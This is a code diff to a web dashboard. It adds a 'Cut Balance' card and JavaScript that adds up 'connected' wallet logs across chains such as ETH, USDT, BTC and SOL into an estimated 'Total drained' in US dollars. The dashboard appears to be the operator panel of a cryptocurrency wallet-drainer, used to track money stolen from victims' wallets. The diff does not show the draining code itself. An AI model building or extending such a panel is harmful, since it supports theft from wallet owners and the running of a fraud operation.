@@ -69,7 +69,7 @@ body::before{content:'';position:fixed;inset:0;
 .main{max-width:1400px;margin:0 auto;padding:36px 40px;}
 
 /* STATS */
-.stats-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:16px;margin-bottom:28px;}
+.stats-grid{display:grid;grid-template-columns:repeat(6,1fr);gap:16px;margin-bottom:28px;}
 .stat-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:22px 20px;
   position:relative;overflow:hidden;transition:transform .2s;}
 .stat-card:hover{transform:translateY(-2px);}
@@ -255,6 +255,11 @@ tbody tr:hover td{background:rgba(0,229,255,.02);}
         <div class="stat-lbl">Today</div>
         <div class="stat-val purple" id="sToday">0</div>
         <div class="stat-sub">Connections today</div>
+      </div>
+      <div class="stat-card" style="--after-bg:var(--safe)">
+        <div class="stat-lbl">Cut Balance</div>
+        <div class="stat-val" id="sCutBal" style="color:var(--safe);font-size:1.35rem">—</div>
+        <div class="stat-sub" id="sCutSub">Total drained (USD est.)</div>
       </div>
     </div>
 
@@ -465,6 +470,38 @@ function updateStats() {
   document.getElementById('sRate').textContent  = rate + '%';
   document.getElementById('sToday').textContent = todayN;
   document.getElementById('refreshTxt').textContent = 'Updated ' + new Date().toLocaleTimeString();
+
+  // Cut Balance — parse amounts from successful tx logs
+  const USD_RATES = {
+    eth: 3500, usdt: 1, usdc: 1, bnb: 400, trx: 0.02,
+    usdt_trc: 1, usdc_trc: 1, sol: 200, btc: 95000
+  };
+  const CHAIN_UNITS = {
+    eth: 3, usdt: 2000, usdc: 2000, bnb: 5, trx: 100000,
+    usdt_trc: 2000, usdc_trc: 2000, sol: 10, btc: 0.2
+  };
+  let totalUSD = 0;
+  const cutBreakdown = {};
+  logs.filter(l => l.status === 'connected').forEach(l => {
+    const units = CHAIN_UNITS[l.chain] || 0;
+    const rate2 = USD_RATES[l.chain] || 0;
+    const usd = units * rate2;
+    totalUSD += usd;
+    cutBreakdown[l.chain] = (cutBreakdown[l.chain] || 0) + usd;
+  });
+  const fmt = v => v >= 1000000 ? '$' + (v/1000000).toFixed(2) + 'M'
+                 : v >= 1000    ? '$' + (v/1000).toFixed(1) + 'K'
+                 :                '$' + v.toFixed(0);
+  document.getElementById('sCutBal').textContent = totalUSD > 0 ? fmt(totalUSD) : '$0';
+  // Build sub-line showing top chain
+  const top = Object.entries(cutBreakdown).sort((a,b)=>b[1]-a[1])[0];
+  const subEl = document.getElementById('sCutSub');
+  if (top) {
+    const info = CHAIN_INFO[top[0]] || {icon:'🔗', label:top[0]};
+    subEl.textContent = 'Top: ' + info.icon + ' ' + info.label + ' (' + fmt(top[1]) + ')';
+  } else {
+    subEl.textContent = 'Total drained (USD est.)';
+  }
 
   renderChart(logs);
   renderBreakdown(logs);
